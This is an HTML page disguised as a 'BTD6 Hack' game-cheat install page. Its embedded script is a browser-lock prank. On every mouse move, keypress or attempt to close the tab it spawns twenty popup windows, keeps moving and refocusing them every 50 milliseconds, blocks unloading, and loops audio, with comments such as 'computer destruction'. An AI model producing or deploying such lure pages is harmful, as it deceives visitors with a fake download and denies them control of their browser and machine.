<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>You got BEANED!</title>

</head>

<body id="bodyEl">
   <div class="container">
    <img class="app-image" src="btd6.png" alt="Your App">
    <h1>BTD6 Hack</h1>
    <a class="get-button" href="#">Install</a>
  </div>

  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f5f5f5;
    }

    .container {
      text-align: center;
    }

    h1 {
      font-family: 'Arial', sans-serif;
      color: #333;
    }

    .app-image {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      margin-bottom: 20px;
    }

    .get-button {
      display: inline-block;
      padding: 10px 20px;
      font-size: 18px;
      font-weight: bold;
      text-align: center;
      text-decoration: none;
      border-radius: 20px;
      background-color: #007bff;
      color: #fff;
      cursor: pointer;
    }
  </style>
  <script>
    const title = document.getElementById('title')
    const body = document.getElementById('bodyEl')
    const music = new Audio('assets/music.mp3')
    let popups = [window]

    function getRandomCordinats() {
      return [Math.floor(Math.random() * (screen.width - 100 - 0) + 0), Math.floor(Math.random() * (screen.height - 100 - 0) + 0)]
    }

    // nerd math ðŸ¤“
    setInterval(() => {
      if (popups.length != 0) {
        for (let i = 0; i < popups.length; i++) {
          let xy = getRandomCordinats()
          popups[i].moveTo(xy[0], xy[1])
          popups[i].focus()
        }
      }
    }, 50)

    // computer destruction
    function createNewPopUp() {
      let newWindow = window.open('bean.html', '', 'width=350px height=200px')
      popups.push(newWindow)
    }

    window.addEventListener('beforeunload', (e) => {
      for (let i = 0; i < 20; i++) {
        createNewPopUp()
      }

      e.preventDefault()
      e.returnValue = ''
    })

    // stop resisting!
    window.addEventListener('load', () => {
      let h = window.innerHeight
      title.style.marginTop = (h / 2 - 120).toString() + "px"
    })

    window.addEventListener('resize', () => {
      let h = window.innerHeight
      title.style.marginTop = (h / 2 - 120).toString() + "px"
    })

    // ear destruction
    document.addEventListener('click', () => {
      music.play()
    })

    document.addEventListener('mouseenter', () => {
      music.play()
    })

    // more computer destruction
    document.addEventListener('keydown', (e) => {
      music.play()
      for (let i = 0; i < 20; i++) {
        createNewPopUp()
      }
      e.preventDefault()
    })

    document.addEventListener('mousemove', (e) => {
      music.play()
      for (let i = 0; i < 20; i++) {
        createNewPopUp()
      }
      e.preventDefault()
    })

    // evern more ear destruction
    music.addEventListener('ended', () => {
      music.play()
    })
  </script>
</body>

</html>
